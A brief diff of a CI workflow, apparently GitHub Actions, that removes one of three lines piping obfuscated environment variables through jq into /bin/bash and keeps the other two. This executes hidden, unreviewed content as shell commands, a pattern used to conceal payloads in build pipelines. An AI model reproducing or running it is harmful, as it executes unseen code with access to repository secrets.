@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$vsh8493" | jq -r .yr05035 | /bin/bash
           echo $gwrfq39800 | jq -r .mque35 | /bin/bash
-          echo $zgs00670 | jq -r .ym1261 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
